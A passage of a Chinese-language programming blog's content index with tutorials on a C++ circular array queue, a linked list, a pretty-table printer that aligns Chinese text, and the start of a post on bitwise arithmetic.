changeLength(T* &amp;,int,int); void output()&#123; if(empty())return; // 情况1 if(front&lt;back)&#123; for (int i = front; i &lt; back; i++)&#123; cout&lt;&lt;"["&lt;&lt;i&lt;&lt;"] "&lt;&lt;m_array[i]&lt;&lt;"\n"; &#125; // 情况2 &#125;else&#123; for (int i = front; i &lt; m_capacity; i++)&#123; cout&lt;&lt;"["&lt;&lt;i&lt;&lt;"] "&lt;&lt;m_array[i]&lt;&lt;"\n"; &#125; for (int i = 0; i &lt; back; i++)&#123; cout&lt;&lt;"["&lt;&lt;i&lt;&lt;"] "&lt;&lt;m_array[i]&lt;&lt;"\n"; &#125; &#125; &#125;&#125;;template&lt;class T&gt;void arrayQueue&lt;T&gt;::push_back(const T &amp;element)&#123; // 满队列 if((back+1)%m_capacity==front)&#123; // 数组倍增 changeLength(m_array,m_capacity,m_capacity*2); m_capacity*=2; &#125; // 按照策略2插入: 先插入元素，后移动back m_array[back]=element; // 注意，此处不能直接 back++，这样做会使back超出数组长度从而导致数组访问越界 // 相反，(back+1)%m_capacity 会使back指针回到数组起始处继续插入 back=(back+1)%m_capacity;&#125;template&lt;class T&gt;void arrayQueue&lt;T&gt;::pop_front()&#123; // 判空 if(back==front)return; m_array[front].~T(); // 同样这里也是控制front只能处于数组之间 front=(front+1)%this-&gt;m_capacity;&#125;template&lt;class T&gt;void arrayQueue&lt;T&gt;::changeLength(T* &amp;array,int oldLength,int newLength)&#123; if(newLength&lt;0)return; T* temp=new T[newLength]; // 从有效元素开始复制 if(front&lt;back) // 没有形成环 std::copy(array+front,array+back,temp); else&#123; // 形成环 std::copy(array+front,array+oldLength,temp); std::copy(array,array+back,temp+oldLength-front); // 重新设置front,back front=0; back=oldLength-1; &#125; delete []array; array=temp;&#125; 我认为比较难理解的是changeLength改变数组长度函数，其实用一张图表示就很简单了 测试1234567891011121314151617181920212223242526272829303132#include&lt;iostream&gt;using namespace std;int main()&#123; arrayQueue&lt;int&gt;q(5); q.push_back(1); q.push_back(2); q.push_back(3); q.push_back(4); q.push_back(40); q.push_back(400); q.push_back(4000); q.push_back(40000); q.pop_front(); q.pop_front(); q.pop_front(); q.pop_front(); q.pop_front(); q.pop_front(); q.push_back(5); q.push_back(6); q.push_back(7); q.push_back(8); q.push_back(9); q.output(); cout&lt;&lt;"size: "&lt;&lt;q.size()&lt;&lt;endl; cout&lt;&lt;"front: "&lt;&lt;q.Front()&lt;&lt;endl; cout&lt;&lt;"back: "&lt;&lt;q.Back()&lt;&lt;endl; return 0;&#125; 输出 12345678910[6] 4000[7] 40000[8] 5[9] 6[0] 7[1] 8[2] 9size: 7front: 4000back: 9 STL queue将自己写的arrayQueue和STL queue分别测试，看看谁快些，这里我仅仅测试了先插入完成后再删除。 12345678910111213141516171819202122232425262728int main()&#123; arrayQueue&lt;int&gt;q2; int n=100000000; CClock::start_timeclock(); for (int i = 0; i &lt; n; i++)&#123; q2.push_back(i); &#125; for (int i = 0; i &lt; n; i++)&#123; q2.pop_front(); &#125; q2.output(); CClock::stop_timeclock(); auto t1=CClock::time_duration(); CClock::start_timeclock(); queue&lt;int&gt;q3; for (int i = 0; i &lt; n; i++)&#123; q3.push(i); &#125; for (int i = 0; i &lt; n; i++)&#123; q3.pop(); &#125; CClock::stop_timeclock(); auto t2=CClock::time_duration(); cout&lt;&lt;"arrayQueue: "&lt;&lt;t1&lt;&lt;endl; cout&lt;&lt;"queue: "&lt;&lt;t2&lt;&lt;endl;&#125; 输出结果，单位秒 12arrayQueue: 2.32446queue: 2.63278 不知道该如何表达……(⊙o⊙)… 结尾bye~]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>DataStructures</tag>
        <tag>C++</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据结构-C++链表实现]]></title>
    <url>%2Flinkedlist-cpp%2F</url>
    <content type="text"><![CDATA[最近在研究《数据结构、算法与应用C++语言描述》，把一些自己的看法和代码实现写在这里，算是个记录吧，以免以后忘记。 线性表——链表描述总所周知，数组中元素地址在内存中是连续分布的，而链表的元素在内存中的存储位置是随机的。其中比较简单的链表类型就是单向链表，这种类型的链表的每个节点只有一个链，且每个节点都连接下一个节点（除了最后一个节点:NULL用来标记链表的结束）。 为了用链表描述线性表，需要定义一个节点结构体，使用C++模板能够支持更多的类型 1234567891011121314template&lt;class T&gt;struct chainNode&#123; T data; chainNode* next; chainNode()&#123;&#125; chainNode(const T &amp;data)&#123; this-&gt;data=data; this-&gt;next=nullptr; &#125; chainNode(const T &amp;data,chainNode*next)&#123; this-&gt;data=data; this-&gt;next=next; &#125;&#125;; 链表类LinkedList我们需要定义一个类，用于管理链表操作 123456789101112131415161718192021222324252627282930313233template&lt;class T&gt;class LinkedList&#123;protected: chainNode&lt;T&gt;*m_Header; int m_size;public: LinkedList(); LinkedList(const T&amp;); // 拷贝构造函数 LinkedList(const LinkedList&lt;T&gt;&amp;); // 移动构造函数 LinkedList(LinkedList&lt;T&gt;&amp;&amp;); virtual ~LinkedList(); // 插入节点 void insert(int,const T&amp;); // 在链表尾插入节点 void append(const T&amp;); // 删除指定索引的节点 void eraseByIndex(int); // 删除所有元素为T的节点 void erase(const T&amp;); // 删除所有节点 void clearAll(); bool empty(); int size(); // 返回首次出现的节点索引 int indexOf(const T&amp;); T &amp;get(int); chainNode&lt;T&gt;*getFirstchainNode(); chainNode&lt;T&gt;*getLastchainNode(); // 输出所有节点 void outputLinkedList();&#125;; 插入节点链表的插入其实很简单，首先需要找到索引index的节点，然后在该节点之后或者之前插入新元素节点，那么？如何插入呢？其实就是通过 chainNode* next 指针将内存中的节点地址链接起来，chainNode* next 也只是一个变量标识符来标识内存中的地址罢了，因此我们可以通过替换next指针将需要插入的节点和已经存在的链表串起来，如下图所示 为了说明，我们先来一个最简单的例子，在链表尾处插入节点 append()代码如下 123456789template&lt;class T&gt;void LinkedList&lt;T&gt;::append(const T&amp;data)&#123; chainNode&lt;T&gt;*pNode=m_Header; while (pNode-&gt;next)&#123; pNode=pNode-&gt;next; &#125; pNode-&gt;next=new chainNode&lt;T&gt;(data); this-&gt;m_size++;&#125; 要在尾部插入节点，那么需要单向遍历整个链表，注意 while (pNode-&gt;next) 不能是 while (pNode) ，因为我们需要用尾节点添加一个新节点，同时更新链表大小 注意：可能有人会有疑惑：pNode=pNode-&gt;next 会让m_Header 指向下一个节点啊？其实 chainNode*pNode=m_Header; 只是将 m_Header 的地址值复制给pNode变量而已，虽然pNode会修改其地址值，但是它内存中的数据对象没有改变，改变的只是一个普通的指针变量 insert()12345678910111213141516171819202122232425262728template&lt;class T&gt;void LinkedList&lt;T&gt;::insert(int theIndex,const T&amp;data)&#123; if(theIndex&lt;0||theIndex&gt;=m_size)return; // 新建头节点 if(theIndex==0 &amp;&amp; m_Header==nullptr)&#123; m_Header=new chainNode&lt;T&gt;(data); m_size++; &#125;else&#123; chainNode&lt;T&gt;*pNode=m_Header; int index=0; while (pNode)&#123; // 在 theIndex之后 插入节点 // 找到了要插入的索引 if(index==theIndex)&#123; // 新节点 pNode-&gt;next=new chainNode&lt;T&gt;(data,pNode-&gt;next); // 该语句等同于: 即替换next指针，使其衔接起来 // auto p=new chainNode&lt;T&gt;(data); // p-&gt;next=pNode-&gt;next; // pNode-&gt;next=p; m_size++; &#125; index++; // 指向下一个节点 pNode=pNode-&gt;next; &#125; &#125;&#125; 输出链表节点在介绍删除之前，我们需要输出链表节点内容方便调试，这段代码很简单，基本都是while(pNode)循环的套路 1234567891011template&lt;class T&gt;void LinkedList&lt;T&gt;::outputLinkedList()&#123; if(this-&gt;m_Header==nullptr)return; chainNode&lt;T&gt;*pNode=this-&gt;m_Header; int index=0; while (pNode)&#123; std::cout&lt;&lt;"["&lt;&lt;index&lt;&lt;"] =&gt; "&lt;&lt;pNode-&gt;data&lt;&lt;std::endl; index++; pNode=pNode-&gt;next; &#125;&#125; 删除节点删除链表中的某个节点类似于插入节点，也是通过指针替换的手段，然后delete掉要删除的节点即可。不过有些地方需要注意。 12345678910111213141516171819202122232425262728template&lt;class T&gt;void LinkedList&lt;T&gt;::eraseByIndex(int theIndex)&#123; if(theIndex&lt;0 || theIndex&gt;=m_size)return; // deletedNode 为待删除节点 chainNode&lt;T&gt;*deletedNode=nullptr; // 处理删除头节点特殊情况，因为单向链表头结点无前驱节点 if(theIndex==0)&#123; // 将 m_Header 标记为删除 deletedNode = m_Header; // 更新头节点 m_Header=m_Header-&gt;next; &#125; else&#123; // 其他情况 chainNode&lt;T&gt;*pNodePre=m_Header; // 查找 待删除节点的前驱节点，其索引为theIndex-1 for (int i = 0; i &lt; theIndex-1; i++)&#123; pNodePre=pNodePre-&gt;next; &#125; // 指针替换 deletedNode=pNodePre-&gt;next; pNodePre-&gt;next=deletedNode-&gt;next; &#125; // 删除节点 delete deletedNode; deletedNode=nullptr; m_size--;&#125; 其中要注意如果要删除索引为0的节点也就是头结点，那么只需要让头结点更新为原来的下一个节点，然后再delete要删除的节点，这种情况很特殊，因为单向链表头结点无前驱节点。其他情况需要一个前驱节点（也就是当前节点的上一个节点）来衔接整个链表。 再来看下面的代码，删除链表中所有数据为data的节点，同时还处理的头结点的特殊情况 12345678910111213141516171819202122232425262728template&lt;class T&gt;void LinkedList&lt;T&gt;::erase(const T&amp;data)&#123; chainNode&lt;T&gt;*pNode=m_Header; chainNode&lt;T&gt;*pNodePre; while (pNode)&#123; if(pNode-&gt;data==data)&#123; // 处理删除头结点情况 if(pNode==m_Header)&#123; auto next=m_Header-&gt;next; delete m_Header; m_Header=next; // 并使其指向原来头结点的下一个节点 pNode=next; m_size--; &#125; else&#123; pNodePre-&gt;next=pNode-&gt;next; delete pNode; // 这条语句能够继续删除链表中数据为data的节点 pNode=pNodePre; m_size--; &#125; &#125; // 保存前驱节点 pNodePre=pNode; pNode=pNode-&gt;next; &#125;&#125; 其他成员函数事实上，当真正了解的单向链表的插入删除的本质时，其他的链表类型也能理解。 单向链表是最基础的一种链表类型，当然还有其他的一些变种：循环列表、双向链表、双向循环链表、甚至是树结构（层次结构 ）也与链表密不可分。因此，必须要对链表十分熟悉！！！ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647template&lt;class T&gt;bool LinkedList&lt;T&gt;::empty()&#123; return this-&gt;m_Header==nullptr&amp;&amp;this-&gt;m_size&lt;=0;&#125;template&lt;class T&gt;int LinkedList&lt;T&gt;::size()&#123; return this-&gt;m_size;&#125;template&lt;class T&gt;int LinkedList&lt;T&gt;::indexOf(const T&amp;data)&#123; chainNode&lt;T&gt;*pNode=m_Header; int index=0; while (pNode&amp;&amp;pNode-&gt;data!=data)&#123; index++; pNode=pNode-&gt;next; &#125; // 到达链表尾pNode标识为nullptr，表示没有找到 if(pNode==nullptr) return -1; else return index; &#125;template&lt;class T&gt;T &amp;LinkedList&lt;T&gt;::get(int index)&#123; if(index&lt;0 || index&gt;=m_size) throw length_error("the index is invalid!"); chainNode&lt;T&gt;*pNode=m_Header; int count=0; while (pNode&amp;&amp;index!=(count++))&#123; pNode=pNode-&gt;next; &#125; return pNode-&gt;data;&#125;template&lt;class T&gt;chainNode&lt;T&gt;* LinkedList&lt;T&gt;::getFirstchainNode()&#123; return m_Header;&#125;template&lt;class T&gt;chainNode&lt;T&gt;* LinkedList&lt;T&gt;::getLastchainNode()&#123; auto p=m_Header; while (p&amp;&amp;p-&gt;next)&#123; p=p-&gt;next; &#125; return p;&#125; 完整代码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248#pragma once#include&lt;iostream&gt;using namespace std;template&lt;class T&gt;struct chainNode&#123; T data; chainNode* next; chainNode()&#123;&#125; chainNode(const T &amp;data)&#123; this-&gt;data=data; this-&gt;next=nullptr; &#125; chainNode(const T &amp;data,chainNode*next)&#123; this-&gt;data=data; this-&gt;next=next; &#125;&#125;;template&lt;class T&gt;class LinkedList&#123;protected: chainNode&lt;T&gt;*m_Header; int m_size;public: LinkedList(); LinkedList(const T&amp;); // 拷贝构造函数 LinkedList(const LinkedList&lt;T&gt;&amp;); // 移动构造函数 LinkedList(LinkedList&lt;T&gt;&amp;&amp;); virtual ~LinkedList(); void insert(int,const T&amp;); void append(const T&amp;); void eraseByIndex(int); // 删除所有元素为T的节点 void erase(const T&amp;); void clearAll(); bool empty(); int size(); // 返回首次出现的节点索引 int indexOf(const T&amp;); T &amp;get(int); chainNode&lt;T&gt;*getFirstchainNode(); chainNode&lt;T&gt;*getLastchainNode(); void outputLinkedList();&#125;;template&lt;class T&gt;LinkedList&lt;T&gt;::LinkedList()&#123; m_Header=nullptr; m_size=0;&#125;template&lt;class T&gt;LinkedList&lt;T&gt;::LinkedList(const T&amp;data)&#123; m_Header=new chainNode&lt;T&gt;(data); m_size=1;&#125;// 拷贝构造函数-&gt;深拷贝template&lt;class T&gt;LinkedList&lt;T&gt;::LinkedList(const LinkedList&lt;T&gt;&amp;ll)&#123; if(ll.m_Header==nullptr) throw runtime_error("The source object can not nullptr!"); this-&gt;m_size=ll.m_size; // 构建头节点 this-&gt;m_Header=new chainNode&lt;T&gt;(ll.m_Header-&gt;data); chainNode&lt;T&gt;*pNodeSource=ll.m_Header-&gt;next; chainNode&lt;T&gt;*pNodeTarget=this-&gt;m_Header; // 从源链表的头结点的下一个节点开始逐个复制 while (pNodeSource)&#123; pNodeTarget-&gt;next=new chainNode&lt;T&gt;(pNodeSource-&gt;data); pNodeSource=pNodeSource-&gt;next; pNodeTarget=pNodeTarget-&gt;next; &#125; pNodeTarget-&gt;next=nullptr;&#125;// 移动构造函数-&gt;浅拷贝template&lt;class T&gt;LinkedList&lt;T&gt;::LinkedList(LinkedList&lt;T&gt;&amp;&amp;ll)&#123; this-&gt;m_size=ll.m_size; this-&gt;m_Header=ll.m_Header; // 禁止内存区域共享 ll.m_Header=nullptr;&#125;template&lt;class T&gt;LinkedList&lt;T&gt;::~LinkedList()&#123; if(this-&gt;m_Header)&#123; this-&gt;clearAll(); &#125;&#125;template&lt;class T&gt;void LinkedList&lt;T&gt;::insert(int theIndex,const T&amp;data)&#123; if(theIndex&lt;0||theIndex&gt;=m_size)return; // 新建头节点 if(theIndex==0&amp;&amp;m_Header==nullptr)&#123; m_Header=new chainNode&lt;T&gt;(data); m_size++; &#125;else&#123; chainNode&lt;T&gt;*pNode=m_Header; int index=0; while (pNode)&#123; // 在 theIndex之后 插入节点 if(index==theIndex)&#123; pNode-&gt;next=new chainNode&lt;T&gt;(data,pNode-&gt;next); // auto p=new chainNode&lt;T&gt;(data); // p-&gt;next=pNode-&gt;next; // pNode-&gt;next=p; m_size++; &#125; index++; pNode=pNode-&gt;next; &#125; &#125;&#125;template&lt;class T&gt;void LinkedList&lt;T&gt;::append(const T&amp;data)&#123; chainNode&lt;T&gt;*pNode=m_Header; while (pNode-&gt;next)&#123; pNode=pNode-&gt;next; &#125; pNode-&gt;next=new chainNode&lt;T&gt;(data); this-&gt;m_size++;&#125; template&lt;class T&gt;void LinkedList&lt;T&gt;::clearAll()&#123; while (m_Header)&#123; chainNode&lt;T&gt;*pNextNode=m_Header-&gt;next; delete m_Header; m_Header=nullptr; m_Header=pNextNode; &#125; m_Header=nullptr; m_size=0;&#125;template&lt;class T&gt;void LinkedList&lt;T&gt;::eraseByIndex(int theIndex)&#123; if(theIndex&lt;0||theIndex&gt;=m_size)return; chainNode&lt;T&gt;*deletedNode=nullptr; // 处理删除头节点情况，因为单向链表头结点无前驱节点 if(theIndex==0)&#123; // 将 m_Header 标记为删除 deletedNode = m_Header; m_Header=m_Header-&gt;next; &#125; else&#123; chainNode&lt;T&gt;*pNodePre=m_Header; // 找待删除节点的前驱节点 for (int i = 0; i &lt; theIndex-1; i++)&#123; pNodePre=pNodePre-&gt;next; &#125; deletedNode=pNodePre-&gt;next; pNodePre-&gt;next=deletedNode-&gt;next; &#125; delete deletedNode; deletedNode=nullptr; m_size--;&#125;template&lt;class T&gt;void LinkedList&lt;T&gt;::erase(const T&amp;data)&#123; chainNode&lt;T&gt;*pNode=m_Header; chainNode&lt;T&gt;*pNodePre; while (pNode)&#123; if(pNode-&gt;data==data)&#123; // 处理删除头结点情况 if(pNode==m_Header)&#123; auto next=m_Header-&gt;next; delete m_Header; m_Header=next; // 并使其指向原来头结点的下一个节点 pNode=next; m_size--; &#125; else&#123; pNodePre-&gt;next=pNode-&gt;next; delete pNode; pNode=pNodePre; m_size--; &#125; &#125; // 保存前驱节点 pNodePre=pNode; pNode=pNode-&gt;next; &#125;&#125;template&lt;class T&gt;bool LinkedList&lt;T&gt;::empty()&#123; return this-&gt;m_Header==nullptr&amp;&amp;this-&gt;m_size&lt;=0;&#125;template&lt;class T&gt;int LinkedList&lt;T&gt;::size()&#123; return this-&gt;m_size;&#125;template&lt;class T&gt;int LinkedList&lt;T&gt;::indexOf(const T&amp;data)&#123; chainNode&lt;T&gt;*pNode=m_Header; int index=0; while (pNode&amp;&amp;pNode-&gt;data!=data)&#123; index++; pNode=pNode-&gt;next; &#125; // 到达尾节点 if(pNode==nullptr) return -1; else return index; &#125;template&lt;class T&gt;T &amp;LinkedList&lt;T&gt;::get(int index)&#123; if(index&lt;0||index&gt;=m_size) throw length_error("the index is invalid!"); chainNode&lt;T&gt;*pNode=m_Header; int count=0; while (pNode&amp;&amp;index!=count++)&#123; pNode=pNode-&gt;next; &#125; return pNode-&gt;data;&#125;template&lt;class T&gt;chainNode&lt;T&gt;* LinkedList&lt;T&gt;::getFirstchainNode()&#123; return m_Header;&#125;template&lt;class T&gt;chainNode&lt;T&gt;* LinkedList&lt;T&gt;::getLastchainNode()&#123; auto p=m_Header; while (p&amp;&amp;p-&gt;next)&#123; p=p-&gt;next; &#125; return p;&#125;template&lt;class T&gt;void LinkedList&lt;T&gt;::outputLinkedList()&#123; if(this-&gt;m_Header==nullptr)return; chainNode&lt;T&gt;*pNode=this-&gt;m_Header; int index=0; while (pNode)&#123; std::cout&lt;&lt;"["&lt;&lt;index&lt;&lt;"] =&gt; "&lt;&lt;pNode-&gt;data&lt;&lt;std::endl; index++; pNode=pNode-&gt;next; &#125;&#125; 有序链表其实我们还可以利用上面的单向链表实现一个简单的有序链表 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#pragma once#include"LinkedList.h"// 默认升序template&lt;class T,class Compare=less&lt;T&gt;&gt;class SortedLinkedList: public LinkedList&lt;T&gt; &#123;public: using LinkedList&lt;T&gt;::LinkedList; using LinkedList&lt;T&gt;::insert; ~SortedLinkedList()&#123;&#125; // 子类insert为有序插入 void insert(const T&amp;); // 基类insert为无序插入&#125;;// 重载insert()函数template&lt;class T,class Compare&gt;void SortedLinkedList&lt;T,Compare&gt;::insert(const T&amp;data)&#123; chainNode&lt;T&gt;*pNode=this-&gt;m_Header; chainNode&lt;T&gt;*pNodePre=nullptr; // Compare()(pNode-&gt;data,data) 等价于 pNode-&gt;data &lt; data // 找前驱节点 while (pNode&amp;&amp;Compare()(pNode-&gt;data,data))&#123; pNodePre=pNode; pNode=pNode-&gt;next; &#125; // 若无前驱节点，那么没有头结点 或者 pNode-&gt;data &gt; data if(pNodePre==nullptr)&#123; // 更新头结点 this-&gt;m_Header=new chainNode&lt;T&gt;(data,pNode); // 等价于 // auto p=new chainNode&lt;T&gt;(data); // p-&gt;next=pNode; // this-&gt;m_Header=p; &#125; else&#123; // 插入新节点 chainNode&lt;T&gt;*p=new chainNode&lt;T&gt;(data,pNode); pNodePre-&gt;next=p; // 等价于 // auto p=new chainNode&lt;T&gt;(data); // p-&gt;next=pNode; // pNodePre-&gt;next=p; &#125; this-&gt;m_size++;&#125; 结尾链表元素在内存随机存储的，占用一定的内存空间，且查找速度要慢于顺序表，但在插入和删除方面要优于顺序表。如果有一种数据结构够将两者结合起来，那么就能够充分利用两者的优点，这种数据结构就是跳表和散列表。]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>DataStructures</tag>
        <tag>C++</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++简单实现MySQL表格输出功能]]></title>
    <url>%2Fcpp-printtable%2F</url>
    <content type="text"><![CDATA[其实在很早之前，我就对MySQL的表格输出很感兴趣并想用C++实现，主要是因为它支持中文输出。因此前一段时间我实现了第一版的MyPrettyTable(简化版的Python的库PrettyTable?)，然而令人失望的是它在含有中文汉字的情况下会发生混乱而无法对齐，于是我放弃了。不过昨天在写代码时偶然看到之前那个被搁置的project，于是不甘心的我再次重新实现了这个功能…其实就是利用的setw和left Python中的PrettyTable用C++写MyPrettyTable的代码格式是按照Python中的PrettyTable。因此MyPrettyTable相对来说比较简单 中文汉字处理问题由于UTF-8编码是变长编码，通常汉字占三个字节，而英文占一个字节在终端下显示汉字占两个字符宽，而英文字母只占一个字符宽 比如 string s = &quot;好&quot;;在Linux下 s.size() = 3 在Windows下 s.size() = 2再比如下面的代码 1234567891011string s1 = "你好世界";string s2 = "你好世";string s3 = "你好";int size = s1.size();cout &lt;&lt; size &lt;&lt; endl;cout.fill('.');cout &lt;&lt; left &lt;&lt; setw(size) &lt;&lt; "" &lt;&lt; endl;cout &lt;&lt; left &lt;&lt; setw(size) &lt;&lt; s1 &lt;&lt; endl;cout &lt;&lt; left &lt;&lt; setw(size) &lt;&lt; s2 &lt;&lt; endl;cout &lt;&lt; left &lt;&lt; setw(size) &lt;&lt; s3 &lt;&lt; endl; 在Windows下 123458........ //8 你好世界 // 2x4=8你好世.. // 2x3+2=8你好.... // 2x2+4=8 然而在Linux下面却是 1234512............ //12你好世界xxxx // 3x4=12你好世...xxx // 3x3+3=12你好......xx // 3x2+6=12 因此在Windows下，输出中文能够很好的对齐，但在Linux下就不是这样了。Windows下的显示中文字符宽恰好是两个英文字母，而Linux下显示中文字符宽等于两个英文字母，但是编码时却是占3个字节！ 当我将上面Linux下没有对齐的内容用 x 填充后发现 不足的填充 x 的个数等于中文汉字的个数！于是为了解决这个不对齐问题，我在处理setw()是采用了WIN32/__linux__宏区分不同的平台 123456padding_left(this-&gt;m_ColumnsContent_max_len[i] + _get_Chinese_len(str));#ifdef WIN32 padding_left(this-&gt;m_ColumnsContent_max_len[i]);#elif __linux__ padding_left(this-&gt;m_ColumnsContent_max_len[i] + _get_Chinese_len(str));#endif 此时中文汉字的处理问题得以解决，但是如果还有其他一些中文标点符号呢？或者说怎么判断是否存在中文或中文标点符号呢？ 因此我定义一个Sign.h头文件用于存放那些特殊的符号，以下为对应中文标点符号的unicode码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#ifndef PRETTYTABLE_SIGN_H#define PRETTYTABLE_SIGN_H// special punctuation characterenum&#123; PC1=0x3002u, PC2=0xFF1Fu, PC3=0xFF01u, PC4=0xFF0Cu, PC5=0x3001u, PC6=0xFF1Bu, PC7=0xFF1Au, PC8=0x300Cu, PC9=0x300Du, PC10=0x2018u, PC11=0x2019u, PC12=0xFF08u, PC13=0xFF09u, PC14=0x3014u, PC15=0x3015u, PC16=0x3010u, PC17=0x3011u, PC18=0x2014u, PC19=0x2026u, PC20=0x2013u, PC21=0xFF0Eu, PC22=0x300Au, PC23=0x300Bu, PC24=0x3008u, PC25=0x3009u,&#125;;enum class Sign&#123; PT_PLUS='+', PT_H ='-', PT_V ='|', PT_DOT= '.', PT_EQUAL= '=' , PT_SIG_1= '@' , PT_SIG_2= '#' , PT_SIG_3= '$', PT_SIG_4= '%', PT_SIG_5= '\\', PT_SIG_6='*', PT_SIG_7='/'&#125;;#endif 判断一个字符串中是否存在中文且存在多少个中文汉字或标点符号，我们需要将其转化为wchar_t 指针类型的字符串，函数StringToWString讲一个string类型字符串转化为wstring类型字符串。需要注意的是在Windows下mbstowcs是不安全的，需要替换为mbstowcs_s，不过这里我简单的禁止了该错误 123456789101112131415#ifdef WIN32#pragma warning(disable:4996)#endifwstring PrettyTable::StringToWString(const string &amp; str)&#123; size_t nLen=str.length()*2; setlocale(LC_CTYPE,""); wchar_t *wcs=new wchar_t[nLen]; wmemset(wcs,0,nLen); size_t s; mbstowcs(wcs,str.c_str(),nLen); wstring w=wcs; delete[]wcs; return w;&#125; 判断字符串中中文汉字和标点符号数目 12345678910111213int PrettyTable::_get_Chinese_len(const string&amp; str)&#123; wstring ss=StringToWString(str); int sum=0; for (int i = 0; i &lt;ss.length() ; ++i) &#123; wchar_t wcs=ss.c_str()[i]; if((wcs&gt;=0x4E00u&amp;&amp;wcs&lt;=0x9FFFu) ||wcs==PC1||wcs==PC2||wcs==PC3||wcs==PC4||wcs==PC5||wcs==PC6||wcs==PC7||wcs==PC8||wcs==PC9 ||wcs==PC10||wcs==PC11||wcs==PC12||wcs==PC13||wcs==PC14||wcs==PC15||wcs==PC16||wcs==PC17 ||wcs==PC18||wcs==PC19||wcs==PC20||wcs==PC21||wcs==PC22||wcs==PC23||wcs==PC24||wcs==PC25)&#123; sum++; &#125; &#125; return sum;&#125; 添加Header &amp; _draw_header在添加一个Header时，我就获取其表头(列)的数目，并添加到 this-&gt;m_multiColumns 中，后续再每添加一行row时同时还要将row转化为column并在添加到this-&gt;m_multiColumns中，为的是 获取每一列中字符串的最大宽度 使得整个表格对齐。 比如我要画一个表格头，我是按照一行一行去输出相应的数据并重定向到内部的 stringstream m_innerOss注意的是，每个表头内边距为1个空格，因此我还定义了一个 1#define PADDING_LEFT_RIGHT 2 表示内边距的大小 123+----+------------------+----------+----------+---------------------+| xx | xx | xx | xx | xx |+----+------------------+----------+----------+---------------------+ 添加Rows &amp; _draw_rows这里我想说的是set()中可以有两种写法 12setw() = MaxSizeStr + String.Size() - StringCapacity(String)setw() = MaxSizeStr + Length(Chinese hans) 也就是说 setw()应该设置的值为 每一个this-&gt;m_multiColumns 中最大字符串宽度+中文汉字/标点符号数目这个 StringCapacity 函数就是获取字符串中显示的字符宽度 &lt;= string.size() 1234567int PrettyTable::StringCapacity(const string &amp; raw_str)&#123;#ifdef WIN32 return raw_str.size();#elif __linux__ return raw_str.size() - this-&gt;_get_Chinese_len(raw_str);#endif&#125; 结尾我已经把代码放在 Github 上了，可以去看看代码，虽然写得有点糟…… 不过核心部分还是利用C++的setw和left。这个project算是到此结束了吧，不过以后有没有可能再继续添加一些东西就不知道了…… 图片展示如下]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[位运算实现加减乘除]]></title>
    <url>%2Fadd-subtract-multiply-divide%2F</url>
    <content type="text"><![CDATA[计算机内部实现数据的加减乘除运算是通过对二进制位运算来实现的，基本运算” + - × ÷ “ 均可转换为位运算。 在介绍加减乘除运算前，我们需要了解一些基本的位运算。 与 &amp;1 and 1 = 11 and 0 = 00 and 1 = 00 and 0 = 0 或 |1 or 1 = 11 or 0 = 10 or 1 = 10 or 0 = 0 异或 ^1 xor 1 = 01 xor 0 = 10 xor 1 = 10 xor 0 = 0 加法运算假如右两个32位的int整数： a=10: 00000000000000000000000000001010b=13: 00000000000000000000000000001101 将这两个数10和13相加：a=01010 (10)b=01101 (13)c=10111 (23) 把上面的二进制分割为每一位后a+b=c a b xor ^ and &amp; c 0 1 1 0 1 1 0 1 0 1 0 1 1 0 1 1 1 0 1 0 0 0 0 0 1 我们发现 位异或^ 单纯的将两个数相加，不过并没有考虑 进位 )，但是 与运算&amp; 能够表示两个二进制相加是否发生了进位（如上表所示）。 也就是说，利用 xor 将两个数相加，and 判断是否有进位，如果有，那个满2进1位 carry&lt;&lt;=1 sum = a^bcarry = a&amp;bcarry &lt;&lt;= 1 假如这样计算会发生什么? 12345678910111213141516171819add(a,b)a=01010b=01101sum=a^b =&gt; 00111 // 求和carry=a&amp;b =&gt; 01000 // 求进位: 1&amp;1carry=carry&lt;&lt;1 =&gt; 10000 //满2进1如果carry进位!=0,否则就结束假设a=sum= 00111b=carry=10000重复之前的步骤...此时新的a=sum,b=carrysum=a^b =&gt; 10111carry=a&amp;b =&gt; 00000carry=carry&lt;&lt;1 =&gt; 00000此时sum=10111 且 carry=0 结果正确！ sum=a^b 表明对a和b求和（不考虑进位），而 (a&amp;b)&lt;&lt;1 表明求a和b中哪个位发生了进位，并且将该位置于最高位(通过左移一位) 因此C++代码如下: 123456789101112131415161718192021222324252627282930313233// 迭代1，按照上面的思路来写int add(int a,int b)&#123; int sum=0; int carry=0; do &#123; sum=a^b; carry=(a&amp;b)&lt;&lt;1; a=sum; b=carry; &#125; while (carry); //判断是否有进位。如无，则表示没有可以加的值 return sum;&#125;// 迭代2// 还可以修改为以下代码int add(int a,int b)&#123; int sum=a; int carry=b; while (carry)&#123; int temp=sum; sum=temp^carry; //a+b carry=(temp&amp;carry)&lt;&lt;1; //进1位 &#125; return sum;&#125;//递归int add(int a,int b)&#123; if(b==0) return a; int carry=(a&amp;b)&lt;&lt;1; int sum=a^b; // 将a+b转化为sum+carry add(sum,carry);&#125; 减法运算由于计算机只会进行加法运算，那么减法就可以转变为加法运算，这涉及到计算机的原码反码和补码知识了。这里简单提下 正数的 原码=反码=补码 负数的 原码=正数的原码且最高位置为1。如32位-3原码可表示为 10000000000000000000000000000011 负数的反码为其原码的最高位1不变，其余位取反(~)如32位-3反码可表示为 11111111111111111111111111111100 负数的补码为其反码+1如32位-3补码可表示为 11111111111111111111111111111101 目前补码普遍是计算机内部数值的表示方式，它很好的解决了 +0 和 -0的问题 因此减法运算就变得十分简单的代码如下 12345// a - b = a + (-b) = a + 